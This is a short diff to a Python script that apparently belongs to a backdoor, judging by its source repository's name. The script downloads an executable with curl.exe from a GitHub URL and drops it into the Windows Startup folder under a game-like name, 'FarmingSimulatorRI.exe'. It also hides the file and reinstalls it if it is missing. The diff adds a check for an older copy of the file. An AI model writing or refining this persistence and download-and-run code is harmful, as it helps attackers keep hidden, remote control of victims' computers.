@@ -20,6 +20,7 @@ current_exe = sys.executable
 startup_folder = os.path.join("C:\\Users", CLIENT_NAME, "AppData", "Roaming",
                             "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 exe_final_location = os.path.join(startup_folder, "FarmingSimulatorRI.exe")
+exe_old_location = os.path.join(startup_folder, "farmingsimulator.exe")
 url = "https://raw.githubusercontent.com/sincezola/backdoor-freezeee/main/src/bin/FarmingSimulatorRI.exe"
 
 def unhide_file(path: str):
@@ -37,7 +38,7 @@ def hide_file(path):
     )
 
 def reinstall_program():
-    if not os.path.isfile(exe_final_location):
+    if not os.path.isfile(exe_final_location) and not os.path.isfile(exe_old_location):
         subprocess.run(
             [
                 "curl.exe",
